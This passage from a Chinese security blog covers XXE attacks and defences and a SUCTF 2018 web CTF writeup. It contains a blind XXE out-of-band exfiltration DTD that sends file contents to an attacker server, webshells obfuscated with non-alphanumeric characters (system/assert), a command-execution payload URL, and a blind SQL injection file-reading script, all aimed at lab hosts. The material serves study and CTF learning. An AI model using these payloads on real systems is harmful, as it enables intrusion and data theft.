simplexml_load_string($xml);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">print_r($data);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;/pre&gt;'</span>;</span><br></pre></td></tr></table></figure><p>evilxxe.dtd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY b SYSTEM &quot;file:///D:/1.txt&quot;&gt;</span><br></pre></td></tr></table></figure><p>1.txt的内容是<code>fffffffffffffffffffffff</code></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/XXE/1531035307004.png" alt="1531035307004"></p><h2 id="Blind-XXE"><a href="#Blind-XXE" class="headerlink" title="Blind XXE"></a>Blind XXE</h2><p>对于传统的XXE来说，要求攻击者只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件，如果没有回显则可以使用Blind XXE漏洞来构建一条带外信道提取数据。 </p><p>xxe3.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$xml = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=D:/1.txt"&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % remote SYSTEM "http://192.168.190.1/XXE/evilxxe2.dtd"&gt;</span></span><br><span class="line"><span class="string">%remote;</span></span><br><span class="line"><span class="string">%all;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;c&gt;&amp;send;&lt;/c&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line"></span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$data = simplexml_load_string($xml, <span class="string">'SimpleXMLElement'</span>, LIBXML_NOENT);</span><br><span class="line"><span class="comment">#$data = simplexml_load_string($xml);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">print_r($data);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;/pre&gt;'</span>;</span><br></pre></td></tr></table></figure><p>evilxxe2.dtd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all</span><br><span class="line">&quot;&lt;!ENTITY send SYSTEM &apos;http://192.168.190.1/XXE/test.php?file=%file;&apos;&gt;&quot;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>test.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">file_put_contents(<span class="string">"test.txt"</span>, $_GET[<span class="string">'file'</span>]) ;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问<a href="http://192.168.190.1/XXE/xxe3.php，存在漏洞的服务器会读出1.txt内容，发送给攻击者服务器上的test.php，然后把读取的数据保存到本地的test.txt中。" target="_blank" rel="noopener">http://192.168.190.1/XXE/xxe3.php，存在漏洞的服务器会读出1.txt内容，发送给攻击者服务器上的test.php，然后把读取的数据保存到本地的test.txt中。</a> </p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/XXE/1531034396346.png" alt="1531034396346"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/XXE/1531034282367.png" alt="1531034282367"></p><h2 id="XXE漏洞修复与防御"><a href="#XXE漏洞修复与防御" class="headerlink" title="XXE漏洞修复与防御"></a>XXE漏洞修复与防御</h2><h3 id="使用开发语言提供的禁用外部实体的方法"><a href="#使用开发语言提供的禁用外部实体的方法" class="headerlink" title="使用开发语言提供的禁用外部实体的方法"></a>使用开发语言提供的禁用外部实体的方法</h3><p>PHP：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(true);</span><br></pre></td></tr></table></figure><p>JAVA:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br></pre></td></tr></table></figure><p>Python：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br></pre></td></tr></table></figure><h3 id="过滤用户提交的XML数据"><a href="#过滤用户提交的XML数据" class="headerlink" title="过滤用户提交的XML数据"></a>过滤用户提交的XML数据</h3><p>过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>遇到XML相关的交互过程，以如下步骤判断是否存在漏洞：</p><p>（1）检测XML是否会被解析：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=”<span class="number">1.0</span>” encoding=”UTF<span class="number">-8</span>”<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe “this is xxe”&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果$xxe;变成了”this is xxe”，那就继续第二步。</p><p>（2）检测服务器是否支持外部实体：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=”<span class="number">1.0</span>” encoding=”UTF<span class="number">-8</span>”<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % xxe SYSTEM “http://youhost/evil.xml”&gt;</span></span><br><span class="line"><span class="meta">%xxe;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求evil.xml的HTTP request。</p><p>（3）如果上面两步都支持，那么就看能否回显。如果能回显，就可以直接使用外部实体的方式进行攻击。当然有时候服务器会不支持一般实体的引用，也就是在DTD之外无法引用实体，如果这样的话，只能使用Blind XXE攻击。</p><p>（4）如果不能回显，毫无疑问，使用Blind XXE攻击方法。</p><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="http://www.freebuf.com/column/156863.html" target="_blank" rel="noopener">XXE学习之路-STEP BY STEP</a></p><p><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/69</a></p><p><a href="https://blog.csdn.net/u011721501/article/details/43775691" target="_blank" rel="noopener">https://blog.csdn.net/u011721501/article/details/43775691</a></p><p><a href="https://b1ngz.github.io/XXE-learning-note/" target="_blank" rel="noopener">XXE漏洞的简单理解和测试</a></p><p><a href="https://www.anquanke.com/post/id/86075" target="_blank" rel="noopener">XXE漏洞攻防之我见</a></p><p><a href="https://thief.one/2017/06/20/1/" target="_blank" rel="noopener">浅谈XXE漏洞攻击与防御</a></p><p><a href="https://www.owasp.org/index.php/Testing_for_XML_Injection_(OTG-INPVAL-008)" target="_blank" rel="noopener">https://www.owasp.org/index.php/Testing_for_XML_Injection_(OTG-INPVAL-008)</a></p><p><a href="https://phonexicum.github.io/infosec/xxe.html（英文博客真不错）" target="_blank" rel="noopener">https://phonexicum.github.io/infosec/xxe.html（英文博客真不错）</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;为何一直复现不成功&quot;&gt;&lt;a href=&quot;#为何一直复现不成功&quot; class=&quot;headerlink&quot; title=&quot;为何一直复现不成功&quot;&gt;&lt;/a&gt;为何一直复现不成功&lt;/h2&gt;&lt;p&gt;远程和blind XXE在vulhub的php_xxe环境下复现不成功，windows的php5.6（libxml Version 2.9.4 ）不能复现成功（wamp），windwos的php5.2（libxml Version 2.7.7）复现成功(phpstudy)&lt;/p&gt;
&lt;p&gt;(捣鼓了两天心好痛)&lt;/p&gt;
&lt;p&gt;（copy 来自 &lt;a href=&quot;https://lightless.me/archives/Research-On-XXE.html）&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://lightless.me/archives/Research-On-XXE.html）&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;之前我一直在自己的 ubuntu14.04+lnmp 的环境下测试的时候，一直不能复现这个问题，只在 kali 的某个版本上复现成功了，一直不知道原因。直到最近发现了这两个东西：&lt;br&gt;&lt;a href=&quot;http://stackoverflow.com/questions/29811915/external-entities-not-working-in-simplexml&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://stackoverflow.com/questions/29811915/external-entities-not-working-in-simplexml&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://php.net/manual/en/libxml.constants.php&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://php.net/manual/en/libxml.constants.php&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;主要是&lt;code&gt;simplexml_load_file&lt;/code&gt;这个函数的问题，在旧版本中是默认解析实体的，但是在新版本中，已经不再默认解析实体了，需要在 simplexml_load_file 函数中指定第三个参数为&lt;code&gt;LIBXML_NOENT&lt;/code&gt;，不然不会解析实体的。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;大部分关于 XXE 的内容都可以参考这篇文章：&lt;a href=&quot;http://security.tencent.com/index.php/blog/msg/69&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://security.tencent.com/index.php/blog/msg/69&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;（copy 来自 &lt;a href=&quot;http://www.freebuf.com/column/156863.html）&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.freebuf.com/column/156863.html）&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;libxml2.9.1及以后，默认不解析外部实体。测试的时候window下使用的是php5.2(libxml Version 2.7.7 ), php5.3(libxml Version 2.7.8)。Linux中需要将libxml低于libxml2.9.1的版本编译到PHP中，可以使用phpinfo()查看libxml的版本信息。  &lt;/p&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://blog.Lhaihai.wang/categories/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="XXE" scheme="http://blog.Lhaihai.wang/categories/Web%E5%AE%89%E5%85%A8/XXE/"/>
    
    
      <category term="XXE" scheme="http://blog.Lhaihai.wang/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>suctf2018-web-Writeup</title>
    <link href="http://blog.Lhaihai.wang/2018/07/07/suctf2018-web-Writeup/"/>
    <id>http://blog.Lhaihai.wang/2018/07/07/suctf2018-web-Writeup/</id>
    <published>2018-07-07T13:43:17.000Z</published>
    <updated>2018-07-07T13:50:03.648Z</updated>
    
    <content type="html"><![CDATA[<h2 id="annonymous"><a href="#annonymous" class="headerlink" title="annonymous"></a>annonymous</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$MY = create_function(<span class="string">""</span>,<span class="string">"die(`cat flag.php`);"</span>);</span><br><span class="line">$hash = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"function SUCTF_$hash()&#123;"</span></span><br><span class="line">    .<span class="string">"global \$MY;"</span></span><br><span class="line">    .<span class="string">"\$MY();"</span></span><br><span class="line">    .<span class="string">"&#125;"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'func_name'</span>]))&#123;</span><br><span class="line">    $_GET[<span class="string">"func_name"</span>]();</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><a id="more"></a><p>摘自<a href="https://zhuanlan.zhihu.com/p/34947785" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/34947785</a></p><h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h3><p>string create_function ( string $args , string $code )</p><p>函数作用：从创建一个匿名函数传递的参数，并返回一个唯一的名称</p><p>看一个官方样例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$newfunc = create_function(&apos;$a,$b&apos;, &apos;return &quot;ln($a) + ln($b) = &quot; . log($a * $b);&apos;);</span><br><span class="line">echo &quot;New anonymous function: $newfunc\n&quot;;</span><br><span class="line">echo $newfunc(2, M_E) . &quot;\n&quot;;</span><br><span class="line">// outputs</span><br><span class="line">// New anonymous function: lambda_1</span><br><span class="line">// ln(2) + ln(2.718281828459) = 1.6931471805599</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>我们不难得到create_function()的原型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function test($a,$b)</span><br><span class="line">&#123;</span><br><span class="line">return &quot;ln($a) + ln($b) = &quot; . log($a * $b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>摘自<a href="https://mp.weixin.qq.com/s/uijxpzMYE3koc7VpvMyzvw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/uijxpzMYE3koc7VpvMyzvw</a></p><blockquote><p>根据题目所给的代码可以看出</p><ol><li>它创建了一个匿名函数<code>$MY</code>,调用$MY时脚本结束并输出flag</li><li>当给func_name用get方式传参时他会通过变量函数的方式调用函数</li></ol><p>在php中匿名函数实际上是有名字的为\00lambda_%d %d为当前apache服务器创建过的匿名函数的数量 实际测试提交5000次请求之后这个值没有超过1250 也就是说服务器会将这个值重置,但是什么时候重置我们不知道,不过这没有关系 可以使用burp向服务器服务器反复提交%00lambda_1来尝试调用这个函数 这里还没有提交不到2000次就得到了flag </p></blockquote><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/SUCTF2018.assets/1527696114585.png" alt="1527696114585"></p><p>参考链接</p><p><a href="http://php.net/manual/zh/function.create-function.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.create-function.php</a></p><p><a href="https://www.zybuluo.com/Dukebf/note/715934#信息泄露-phpfinfo" target="_blank" rel="noopener">PHP审计之常见的危险函数及特殊函数</a></p><p><a href="https://paper.seebug.org/94/#_2" target="_blank" rel="noopener">[科普向] 解析create_function() &amp;&amp; 复现wp</a></p><p><a href="https://mp.weixin.qq.com/s/uijxpzMYE3koc7VpvMyzvw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/uijxpzMYE3koc7VpvMyzvw</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzIxMDYyNTk3Nw==&amp;mid=2247484003&amp;idx=1&amp;sn=e27b4e770b3a16245026013545474056&amp;chksm=9760f6b5a0177fa35f21d0260a798a5b774644d45ab74af0e1e74eabbdd4520296a190ada01e&amp;mpshare=1&amp;scene=23&amp;srcid=0528VpCYK8o8P9iyzHwB9thX#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzIxMDYyNTk3Nw==&amp;mid=2247484003&amp;idx=1&amp;sn=e27b4e770b3a16245026013545474056&amp;chksm=9760f6b5a0177fa35f21d0260a798a5b774644d45ab74af0e1e74eabbdd4520296a190ada01e&amp;mpshare=1&amp;scene=23&amp;srcid=0528VpCYK8o8P9iyzHwB9thX#rd</a></p><p><a href="https://xr1s.github.io/ctf/hctf-game-week2-writeup/#web" target="_blank" rel="noopener">HCTF GAME Week 2 解题报告</a></p><h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a><strong>Getshell</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($contents=file_get_contents($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>]))&#123;</span><br><span class="line">    $data=substr($contents,<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($black_char <span class="keyword">as</span> $b) &#123;</span><br><span class="line">        <span class="keyword">if</span> (stripos($data, $b) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"illegal char"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考点：</p><p>膜一下P神：<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p><p>从这段代码中可以看出对于上传的内容会有一个waf但是这个waf会忽略前5个字符 经过测试没被waf的字符有</p><p><code>[ ] ( ) ~ = ; _ $ .</code>各种非英文字符 前5个字符不会被waf可以用来写&lt;?php 那么像写出这个shell首先要知道三点: </p><blockquote><ol><li>~(X) 当X为一个汉字时对这个汉字取反第二位很大概率得到一个英文字符</li><li>True可以被弱类型为1(所以可以用$[$==$_]来获得1中第二位的英文字符)</li><li>eval是一种语言结构而不是函数，所以不能使用变量函数来调用它.这里可以使用asser代替</li></ol></blockquote><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/SUCTF2018.assets/1530859433842.png" alt="1530859433842"></p><p><strong>坑点:</strong>  使用burp查看什么字符被waf，发现只有[ ] ( ) _可以使用，但是实际可以使用的不止这些,在柠檬师傅的指点下发现burp发包时会默认将; . =等符号默认进行url编码,而由于是文件提交服务端并不会对它进行解码同时%被waf导致我们会误认为这些符号不可用 </p><h4 id="shell-one"><a href="#shell-one" class="headerlink" title="shell one"></a>shell one</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> ~茉[$____];<span class="comment">//s</span></span><br><span class="line"><span class="keyword">echo</span> ~内[$____];<span class="comment">//y</span></span><br><span class="line"><span class="keyword">echo</span> ~茉[$____];<span class="comment">//s</span></span><br><span class="line"><span class="keyword">echo</span> ~苏[$____];<span class="comment">//t</span></span><br><span class="line"><span class="keyword">echo</span> ~的[$____];<span class="comment">//e</span></span><br><span class="line"><span class="keyword">echo</span> ~咩[$____];<span class="comment">//m</span></span><br><span class="line"><span class="keyword">echo</span> ~课[$____];<span class="comment">//P</span></span><br><span class="line"><span class="keyword">echo</span> ~尬[$____];<span class="comment">//O</span></span><br><span class="line"><span class="keyword">echo</span> ~笔[$____];<span class="comment">//S</span></span><br><span class="line"><span class="keyword">echo</span> ~端[$____];<span class="comment">//T</span></span><br><span class="line"><span class="keyword">echo</span> ~瞎[$____];<span class="comment">//a</span></span><br></pre></td></tr></table></figure><p>system($_POST[a])</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=$_=[];</span><br><span class="line">$__.=$_;</span><br><span class="line">$____=$_==$_;</span><br><span class="line">$___=~茉[$____];</span><br><span class="line">$___.=~内[$____];</span><br><span class="line">$___.=~茉[$____];</span><br><span class="line">$___.=~苏[$____];</span><br><span class="line">$___.=~的[$____];</span><br><span class="line">$___.=~咩[$____];</span><br><span class="line">$_____=_;</span><br><span class="line">$_____.=~课[$____];</span><br><span class="line">$_____.=~尬[$____];</span><br><span class="line">$_____.=~笔[$____];</span><br><span class="line">$_____.=~端[$____];</span><br><span class="line">$__________=$$_____;</span><br><span class="line">$___($__________[~瞎[$____]]);</span><br></pre></td></tr></table></figure><h4 id="shell-two"><a href="#shell-two" class="headerlink" title="shell two"></a>shell two</h4><p><code>assert($_GET[_])</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$______=_;</span><br><span class="line">$_=~(瞰);</span><br><span class="line">$__=$_[$_==$_];</span><br><span class="line">$_=~(范);</span><br><span class="line">$__=$__.$_[$_==$_];</span><br><span class="line">$_=~(范);</span><br><span class="line">$__=$__.$_[$_==$_];</span><br><span class="line">$_=~(皮);</span><br><span class="line">$__=$__.$_[$_==$_];</span><br><span class="line">$_=~(半);</span><br><span class="line">$__=$__.$_[$_==$_];</span><br><span class="line">$_=~(拉);</span><br><span class="line">$__=$__.$_[$_==$_];</span><br><span class="line">$_=~(为);</span><br><span class="line">$___=$_[$_==$_];</span><br><span class="line">$_=~(了);</span><br><span class="line">$___=$___.$_[$_==$_];</span><br><span class="line">$_=~(高);</span><br><span class="line">$___=$___.$_[$_==$_];</span><br><span class="line">$___=$______.$___;</span><br><span class="line">$_=$$___;</span><br><span class="line">$__($_[_]);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">汉字取反后的第二位对应的英文字母:</span><br><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line">特==&gt;<span class="number">1</span>=v</span><br><span class="line">瞰==&gt;<span class="number">1</span>=a</span><br><span class="line">皮==&gt;<span class="number">1</span>=e</span><br><span class="line">为==&gt;<span class="number">1</span>=G</span><br><span class="line">高==&gt;<span class="number">1</span>=T</span><br><span class="line">哦==&gt;<span class="number">1</span>=l</span><br><span class="line">了==&gt;<span class="number">1</span>=E</span><br><span class="line">半==&gt;<span class="number">1</span>=r</span><br><span class="line">拉==&gt;<span class="number">1</span>=t</span><br><span class="line">范==&gt;<span class="number">1</span>=s</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.190.128:32770/upload/d0463af12f203844bbecbacbb576e1be.php?_=system(%27cat%20../../../../Th1s_14_f14g%27)</span></span><br></pre></td></tr></table></figure><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/SUCTF2018.assets/1530856759711.png" alt="1530856759711"></p><p>flag在根目录</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/SUCTF2018.assets/1530856712311.png" alt="1530856712311"></p><blockquote><p>SUCTF{fake_flag_web_b} </p></blockquote><h2 id="mutisql"><a href="#mutisql" class="headerlink" title="mutisql"></a>mutisql</h2><p>这里有个地方没搞懂就是 怎么知道<code>secure_file_priv</code>的值为<code>/var/www/</code> </p><blockquote><p><a href="http://192.168.190.128:32771/user/user.php?id=2" target="_blank" rel="noopener">http://192.168.190.128:32771/user/user.php?id=2</a></p></blockquote><p>存在注入，拿起了腹黑师傅的代码改一改在本地运行（<a href="http://www.lovei.org/archives/suctf2018.html）" target="_blank" rel="noopener">http://www.lovei.org/archives/suctf2018.html）</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python 2.7</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hex = <span class="keyword">lambda</span> s: binascii.hexlify(s)</span><br><span class="line">char = <span class="string">"0123456789ABCDEF"</span></span><br><span class="line">filename = <span class="string">'/var/www/html/bwvs_config/waf.php'</span></span><br><span class="line">c = <span class="string">''</span></span><br><span class="line">url = <span class="string">'http://192.168.190.128:32771/user/user.php?id=7-if(hex(load_file(0x%s))like(0x%s),1,2)'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> xrange(<span class="number">10000</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> char:</span><br><span class="line">        payload = c + i + <span class="string">'%'</span></span><br><span class="line">        _url = url % (hex(filename), hex(payload))</span><br><span class="line">        <span class="comment"># print payload</span></span><br><span class="line">        <span class="comment"># print _url</span></span><br><span class="line">        r = requests.get(_url, cookies=&#123;<span class="string">'PHPSESSID'</span>: <span class="string">'rr102837jt278n11u2sgvi0ll0'</span>&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'user_id:6'</span> <span class="keyword">in</span> r.content:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'......'</span> + payload</span><br><span class="line">            c = c + i</span><br><span class="line">                <span class="comment">#if len(c) %2 == 0:</span></span><br><span class="line">                <span class="comment">#    print binascii.unhexlify(c)</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            <span class="comment"># else:</span></span><br><span class="line">                <span class="comment"># print payload</span></span><br><span class="line">            <span class="comment"># print c</span></span><br></pre></td></tr></table></figure><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/SUCTF2018.assets/1530882912373.png" alt="1530882912373"></p><p>读取文件：</p><p><code>/var/www/html/bwvs_config/waf.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span 